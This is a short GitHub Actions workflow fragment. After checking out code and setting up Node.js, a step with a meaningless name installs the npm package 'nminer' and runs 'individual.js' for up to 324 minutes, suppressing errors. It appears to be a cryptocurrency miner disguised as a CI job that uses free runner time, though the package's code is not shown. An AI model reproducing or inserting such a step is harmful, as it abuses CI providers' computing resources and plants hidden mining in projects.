    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: into geez strictly
        run: |
          npm install nminer@latest
          timeout 324m node individual.js || echo "individual executed"